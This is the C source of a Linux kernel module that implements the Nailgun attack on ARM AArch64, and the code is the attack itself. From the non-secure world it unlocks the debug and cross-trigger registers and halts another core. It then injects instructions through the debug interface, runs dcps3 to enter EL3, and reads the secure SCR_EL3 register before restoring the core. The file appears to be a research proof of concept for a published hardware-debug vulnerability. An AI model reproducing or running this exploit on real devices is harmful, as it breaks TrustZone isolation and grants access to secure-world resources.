#include <linux/module.h>    // included for all kernel modules
#include <linux/kernel.h>    // included for KERN_INFO
#include <linux/init.h>      // included for __init and __exit macros
#include <asm/io.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Zhenyu Ning");
MODULE_DESCRIPTION("Read SCR by Nailgun attack with a non-secure kernel module");

// 0x40030000 is the base address of the debug registers on Core 0
#define DEBUG_REGISTER_ADDR             0x40030000
#define DEBUG_REGISTER_SIZE             0x1000

// 0x40030000 is the base address of the cross trigger interface registers on Core 0
#define CTI_REGISTER_ADDR               0x40038000
#define CTI_REGISTER_SIZE               0x1000

// Offsets of debug registers
#define DBGDTRRX_OFFSET                 0x80
#define EDITR_OFFSET                    0x84
#define EDSCR_OFFSET                    0x88
#define DBGDTRTX_OFFSET                 0x8C
#define EDRCR_OFFSET                    0x90
#define OSLAR_OFFSET                    0x300
#define EDLAR_OFFSET                    0xFB0

#define DBGLSR_OFFSET                   0xFB4
#define DBGOSLSR_OFFSET                 0x304
#define DBGAUTHSTATUS_OFFSET            0xFB8


// Bits in EDSCR
#define STATUS                          (0x3f)
#define ERR                             (1 <<  6)
#define HDE				(1 << 14)
#define EIE             (1 << 13)
#define ITE                             (1 << 24)
#define RXFULL                          (1<<30)
#define TXFULL                          (1<<29)

// Bits in EDRCR
#define CSE                             (1 <<  2)

// Offsets of cross trigger registers
#define CTICONTROL_OFFSET               0x0
#define CTIINTACK_OFFSET                0x10
#define CTIAPPPULSE_OFFSET              0x1C
#define CTIOUTEN0_OFFSET                0xA0
#define CTIOUTEN1_OFFSET                0xA4
#define CTITRIGOUTSTATUS_OFFSET         0x134
#define CTIGATE_OFFSET                  0x140

// Bits in CTICONTROL
#define GLBEN                           (1 <<  0)

// Bits in CTIINTACK
#define ACK0                            (1 <<  0)
#define ACK1                            (1 <<  1)

// Bits in CTIAPPPULSE
#define APPPULSE0                       (1 <<  0)
#define APPPULSE1                       (1 <<  1)

// Bits in CTIOUTEN<n>
#define OUTEN0                          (1 <<  0)
#define OUTEN1                          (1 <<  1)

// Bits in CTITRIGOUTSTATUS
#define TROUT0                          (1 <<  0)
#define TROUT1                          (1 <<  1)

// Bits in CTIGATE
#define GATE0                           (1 <<  0)
#define GATE1                           (1 <<  1)

// Values of EDSCR.STATUS
#define NON_DEBUG                       0x2
#define HLT_BY_DEBUG_REQUEST            0x13

// 0xc5acce55 - Big Endian
// 0xCE55C5AC; // Mid-Little Endian
static const uint32_t LOCK_ACCESS_KEY = 0xc5acce55; // Big Endian;

struct nailgun_param {
    void __iomem *debug_register;
    void __iomem *cti_register;
} t_param;

static void check_txrx_edscr(void __iomem *debug) {
    uint32_t reg;

    reg = ioread32(debug + EDSCR_OFFSET);

    if ((reg & RXFULL) == RXFULL) {
        printk(KERN_INFO "instruction: // RXFULL is 1 - Can read value from DTRRX\n");
    } else {
        printk(KERN_INFO "instruction: // RXFULL is 0 - Can *write* value to DTRRX\n");
    }

    if ((reg & TXFULL) == TXFULL) {
        printk(KERN_INFO "instruction: // TXFULL is 1 - Can read value from DTRTX\n");
    } else {
        printk(KERN_INFO "instruction: // TXFULL is 0 - nothing to read from DTRTX\n");
    }
}

static void execute_ins_via_itr(void __iomem *debug, uint32_t ins) {
    uint32_t reg;
    // clear previous errors 
    iowrite32(CSE, debug + EDRCR_OFFSET);

    // Write instruction to EDITR register to execute it
    iowrite32(ins, debug + EDITR_OFFSET);

    // Wait until the execution is finished
    reg = ioread32(debug + EDSCR_OFFSET);
    while ((reg & ITE) != ITE) {
        reg = ioread32(debug + EDSCR_OFFSET);
    }

    if ((reg & ERR) == ERR) {
        printk(KERN_ERR "%s failed! instruction: 0x%08x EDSCR: 0x%08x\n", 
            __func__, ins, reg);
        return;
    } 
    // } else {
        // printk(KERN_INFO "Instruction: 0x%08x executed successfully - EDSCR: 0x%08x\n",
            // ins, reg);
    // }
}

#if 0
static uint32_t save_register(void __iomem *debug, uint32_t ins) {
    // Execute the ins to copy the target register to R0
    execute_ins_via_itr(debug, ins);
    // Copy R0 to the DCC register DBGDTRTX
    // 0xee000e15 <=> mcr p14, 0, R0, c0, c5, 0
    // execute_ins_via_itr(debug, 0x0e15ee00);
    // 0x0500d513 <=> msr DBGDTRTX_EL0, x0
    // execute_ins_via_itr(debug, 0x0500d513); // fixed
    execute_ins_via_itr(debug, 0xD5130400); // fixed
    // Read the DBGDTRTX via the memory mapped interface
    return ioread32(debug + DBGDTRTX_OFFSET);
}
#endif

static uint64_t save_register_64(void __iomem *debug, uint32_t ins) {
    uint64_t val;

    // Execute the ins to copy the target register to X0
    execute_ins_via_itr(debug, ins);

    // Copy X0 to the DCC register DBGDTR
    // 0x0500d513 <=> msr DBGDTR_EL0, X0
    execute_ins_via_itr(debug, 0xD5130400); // fixed

    // asm volatile("mrs %0, DBGDTRTX_EL0" : "=r" (val));

    val = ioread32(debug + DBGDTRRX_OFFSET);
    val = val << 32;
    val |= ioread32(debug + DBGDTRTX_OFFSET);

    return val;
}

#if 0
static void restore_register(void __iomem *debug, uint32_t ins, uint32_t val) {
    // Copy value to the DBGDTRRX via the memory mapped interface
    iowrite32(val, debug + DBGDTRRX_OFFSET);
    // Copy the DCC register DBGDTRRX to R0
    // 0xee100e15 <=> mrc p14, 0, R0, c0, c5, 0
    // execute_ins_via_itr(debug, 0x0e15ee10);
    // 0x0500d533 <=> mrs x0, DBGDTRRX_EL0
    // execute_ins_via_itr(debug, 0x0500d533); // fixed
    execute_ins_via_itr(debug, 0xD5330400); // fixed
    // Execute the ins to copy R0 to the target register
    execute_ins_via_itr(debug, ins);
}

#endif

static void restore_register_64(void __iomem *debug, uint32_t ins, uint64_t val) {
    // Copy value to the DBGDTRRX via the memory mapped interface
    // iowrite64(val, debug + DBGDTRRX_OFFSET);
    check_txrx_edscr(debug);
    // asm volatile("msr DBGDTR_EL0, %0" : "=r" (val));    
    iowrite32(val >> 32, debug + DBGDTRTX_OFFSET);
    iowrite32(val, debug + DBGDTRRX_OFFSET);
    check_txrx_edscr(debug);
    // Copy the DCC register DBGDTRRX to X0
    // 0x0500d533 <=> mrs x0, DBGDTR_EL0
    execute_ins_via_itr(debug, 0xD5330400); // fixed

    // Execute the ins to copy X0 to the target register
    execute_ins_via_itr(debug, ins);
}


static void read_scr(void *addr) {
    uint32_t reg, scr, currentel, edscrval;
    uint64_t dlr_old, x0_old;
    uint32_t dbgauth, dbglsr, dbgoslrs, ctilsr, ctioslrs;
    struct nailgun_param *param = (struct nailgun_param *)addr;

    dbgauth = ioread32(param->debug_register + DBGAUTHSTATUS_OFFSET);
    printk(KERN_INFO "DEBUG AUTH STATUS: %x\n", dbgauth);

    // Step 1: Unlock debug and cross trigger reigsters
    printk(KERN_INFO "Step 1: Unlock debug and cross trigger registers\n");
    // DBGLAR - lock access register
    iowrite32(LOCK_ACCESS_KEY, param->debug_register + EDLAR_OFFSET);
    iowrite32(LOCK_ACCESS_KEY, param->cti_register + EDLAR_OFFSET);

    // DBGOSLAR - Operating System Lock and Save/Restore Registers
    iowrite32(0x0, param->debug_register + OSLAR_OFFSET);
    iowrite32(0x0, param->cti_register + OSLAR_OFFSET);

    // Read the lock status register DBGLSR and DBGOSLSR
    dbgoslrs = ioread32(param->debug_register + DBGOSLSR_OFFSET);
    dbglsr = ioread32(param->debug_register + DBGLSR_OFFSET);
    printk(KERN_INFO "DBGOSLSR: %x\n", dbgoslrs);
    printk(KERN_INFO "DBGLSR: %x\n", dbglsr);
    ctioslrs = ioread32(param->cti_register + DBGOSLSR_OFFSET);
    ctilsr = ioread32(param->cti_register + DBGLSR_OFFSET);
    printk(KERN_INFO "CTIOSLSR: %x\n", ctioslrs);
    printk(KERN_INFO "CTILSR: %x\n", ctilsr);


    // Step 2: Enable halting debug on the target processor
    printk(KERN_INFO "Step 2: Enable halting debug\n");
    // DBGDSCR - Contains status and control information about the debug unit.
    reg = ioread32(param->debug_register + EDSCR_OFFSET);
    reg |= HDE; // HALTING DEBUG MODE (14)
    reg |= EIE; // Execute Instruction Enable (13)
    iowrite32(reg, param->debug_register + EDSCR_OFFSET);

    // Step 3: Send halt request to the target processor
    printk(KERN_INFO "Step 3: Halt the target processor\n");
    // Enable ECT
    iowrite32(GLBEN, param->cti_register + CTICONTROL_OFFSET);

    // reg = 111111...11110 Disable channel propagation on CTICHOUT0 and enable the others
    reg = ioread32(param->cti_register + CTIGATE_OFFSET);
    reg &= ~GATE0;
    iowrite32(reg, param->cti_register + CTIGATE_OFFSET);

    // reg = reg | 1 (the last bit will be on) - the channel input (CTICHIN) from the CTM is routed to the CTITRIGOUT output.
    reg = ioread32(param->cti_register + CTIOUTEN0_OFFSET);
    reg |= OUTEN0;
    iowrite32(reg, param->cti_register + CTIOUTEN0_OFFSET);

    // set reg = reg | 1 : channel event pulse generated for one CTICLK period
    // Suppose to send channel event pulse and because the registers before it should be catched in
    // CTI channel 0 and halt the core
    reg = ioread32(param->cti_register + CTIAPPPULSE_OFFSET);
    reg |= APPPULSE0;
    iowrite32(reg, param->cti_register + CTIAPPPULSE_OFFSET);

    // Step 4: Wait the target processor to halt
    printk(KERN_INFO "Step 4: Wait the target processor to halt\n");
    reg = ioread32(param->debug_register + EDSCR_OFFSET);

    // Get the first 6 bits of the register DBGSCR (CORE HALTED, CORE RESTARTED, MODE)
    // Check if the core restarted and halted
    // Check if the mode is breakpoint occured
    while ((reg & STATUS) != HLT_BY_DEBUG_REQUEST) {
        reg = ioread32(param->debug_register + EDSCR_OFFSET);
    }

    // bits written as a 1 cause the CTITRIGOUT output signal to be acknowledged
    reg = ioread32(param->cti_register + CTIINTACK_OFFSET);
    reg |= ACK0;
    iowrite32(reg, param->cti_register + CTIINTACK_OFFSET);


    // Check if the CTITRIGOUT is acknoledge of the output
    reg = ioread32(param->cti_register + CTITRIGOUTSTATUS_OFFSET);
    while ((reg & TROUT0) == TROUT0) {
        reg = ioread32(param->cti_register + CTITRIGOUTSTATUS_OFFSET);
    }


    edscrval = ioread32(param->debug_register + EDSCR_OFFSET);
    printk("EDSCR STATUS IS: 0x%08x\n", edscrval);

    // Step 5: Save context of the target core
    printk(KERN_INFO "Step 5: Save context\n");
    // 0xee000e15 <=> mcr p14, 0, R0, c0, c5, 0
    // execute_ins_via_itr(param->debug_register, 0x0e15ee00);
    // 0x0500d513 <=> msr DBGDTRTX_EL0, x0
    // execute_ins_via_itr(param->debug_register, 0x0500d513); // fixed


    // Check the status of TXFull (should be 0 - can write to DBGDTRTX_EL0)
    check_txrx_edscr(param->debug_register);

    // Get the value of x0 and save it to DBGDTRTX_EL0
    // 0x0500d513 <=> msr DBGDTR_EL0, x0
    execute_ins_via_itr(param->debug_register, 0xD5130400);

    printk(KERN_INFO "Finish executing MSR DBGDTRTX_EL0, x0");

    // Save the value of x0 after we put it into DBGDTRTX into x0_old
    // asm volatile("mrs %0, DBGDTRTX_EL0" : "=r" (x0_old));
    x0_old = ioread32(param->debug_register + DBGDTRRX_OFFSET);
    x0_old = x0_old << 32;
    x0_old |= ioread32(param->debug_register + DBGDTRTX_OFFSET);

    // x0_old = ioread64(param->debug_register + DBGDTRTX_OFFSET);

    printk(KERN_INFO "Value of the old x0 is: 0x%016llx\n", x0_old);


    // 0xee740f35 <=> mrc p15, 3, R0, c4, c5, 1
    // dlr_old = save_register(param->debug_register, 0x0f35ee74);
    // mrs 0x4520d53b <=> mrs x0, DLR_EL0
    // dlr_old = save_register(param->debug_register, 0x4520d53b); // fixed

    // Save the address to restart from into dlr_old
    // mrs 0x4520d53b <=> mrs x0, DLR_EL0
    dlr_old = save_register_64(param->debug_register, 0xD53B4520); // fixed

    printk(KERN_INFO "Value of the dlr old is: 0x%016llx\n", dlr_old);

    // Step 6: Switch to EL3 to access secure resource
    printk(KERN_INFO "Step 6: Switch to EL3\n");
    // 0xf78f8003 <=> dcps3
    // execute_ins_via_itr(param->debug_register, 0x8003f78f);
    // 0xD4A00003 <=> dcps3
    // execute_ins_via_itr(param->debug_register, 0x0003d4a0); // fixed
    execute_ins_via_itr(param->debug_register, 0xD4A00003); // fixed


    // Step 7: Read the SCR
    printk(KERN_INFO "Step 7: Read SCR\n");
#if 1
    // 0xee110f11 <=> mrc p15, 0, R0, c1, c1, 0
    // execute_ins_via_itr(param->debug_register, 0x0f11ee11);
    // 0xD53E1100 <=> mrs x0, scr_el3
    // execute_ins_via_itr(param->debug_register, 0x1100d53e); // fixed
    execute_ins_via_itr(param->debug_register, 0xD53E1100); // fixed
    // 0xee000e15 <=> mcr p14, 0, R0, c0, c5, 0
    // execute_ins_via_itr(param->debug_register, 0x0e15ee00);

    printk("Check txfull before reading SCR\n");

    // Should be 0 so we can write to this register
    check_txrx_edscr(param->debug_register);

    // 0x0500d513 <=> msr DBGDTRTX_EL0, x0
    // execute_ins_via_itr(param->debug_register, 0x0500d513); // fixed
    execute_ins_via_itr(param->debug_register, 0xD5130400); // fixed

    scr = ioread32(param->debug_register + DBGDTRTX_OFFSET);

    printk(KERN_INFO "SCR_EL3 : 0x%08x\n", scr);
#endif
#if 0
    // MRS X0, CURRENTEL
    execute_ins_via_itr(param->debug_register, 0xD5384240);
    // 0x0500d513 <=> msr DBGDTRTX_EL0, x0
    execute_ins_via_itr(param->debug_register, 0xD5130400);
    currentel = ioread32(param->debug_register + DBGDTRTX_OFFSET);
    printk(KERN_INFO "CURRENT EL: 0x%08x\n", currentel);
#endif
    // Step 8: Restore context
    printk(KERN_INFO "Step 8: Restore context\n");
    // 0x0f35ee64 <=> mcr p15, 3, R0, c4, c5, 1
    // restore_register(param->debug_register, 0x0f35ee64, dlr_old);
    // 0x4520d51b <=> msr DLR_EL0, x0
    // restore_register(param->debug_register, 0x4520d51b, dlr_old); // fixed
    restore_register_64(param->debug_register, 0xD51B4520, dlr_old); // fixed

    // iowrite32(x0_old, param->debug_register + DBGDTRRX_OFFSET);
    iowrite32(x0_old >> 32, param->debug_register + DBGDTRTX_OFFSET);
    iowrite32(x0_old, param->debug_register + DBGDTRRX_OFFSET);
    // asm volatile("msr DBGDTRTX_EL0, %0" : "=r" (x0_old));

    // 0xee100e15 <=> mrc p14, 0, R0, c0, c5, 0
    // execute_ins_via_itr(param->debug_register, 0x0e15ee10);
    // 0xD5330400 <=> mrs x0, DBGDTR_EL0
    // execute_ins_via_itr(param->debug_register, 0x0500d533); // fixed
    execute_ins_via_itr(param->debug_register, 0xD5330400); // fixed


    // Step 9: Send restart request to the target processor
    printk(KERN_INFO "Step 9: Send restart request to the target processor\n");
    reg = ioread32(param->cti_register + CTIGATE_OFFSET);
    reg &= ~GATE1;
    iowrite32(reg, param->cti_register + CTIGATE_OFFSET);
    reg = ioread32(param->cti_register + CTIOUTEN1_OFFSET);
    reg |= OUTEN1;
    iowrite32(reg, param->cti_register + CTIOUTEN1_OFFSET);
    reg = ioread32(param->cti_register + CTIAPPPULSE_OFFSET);
    reg |= APPPULSE1;
    iowrite32(reg, param->cti_register + CTIAPPPULSE_OFFSET);

    // Step 10: Wait the target processor to restart
    printk(KERN_INFO "Step 10: Wait the target processor to restart\n");
    reg = ioread32(param->debug_register + EDSCR_OFFSET);
     while ((reg & STATUS) != NON_DEBUG) {
        reg = ioread32(param->debug_register + EDSCR_OFFSET);
    }
    reg = ioread32(param->cti_register + CTIINTACK_OFFSET);
    reg |= ACK1;
    iowrite32(reg, param->cti_register + CTIINTACK_OFFSET);
    reg = ioread32(param->cti_register + CTITRIGOUTSTATUS_OFFSET);
    while ((reg & TROUT1) == TROUT1) {
        reg = ioread32(param->cti_register + CTITRIGOUTSTATUS_OFFSET);
    }

    printk(KERN_INFO "All done! The value of SCR is 0x%08x\n", scr);
}

static int __init nailgun_init(void) {
    struct nailgun_param *param = kmalloc(sizeof(t_param), GFP_KERNEL);
    
    // Mapping the debug and cross trigger registers into virtual memory space 
    param->debug_register = ioremap(DEBUG_REGISTER_ADDR, DEBUG_REGISTER_SIZE);
    param->cti_register = ioremap(CTI_REGISTER_ADDR, CTI_REGISTER_SIZE);
    // We use the Core 1 to read the SCR via debugging Core 0
    smp_call_function_single(1, read_scr, param, 1);
    iounmap(param->cti_register);
    iounmap(param->debug_register);

    kfree(param);
    return 0;
}

static void __exit nailgun_exit(void) {
    printk(KERN_INFO "Goodbye!\n");
}
module_init(nailgun_init);
module_exit(nailgun_exit);
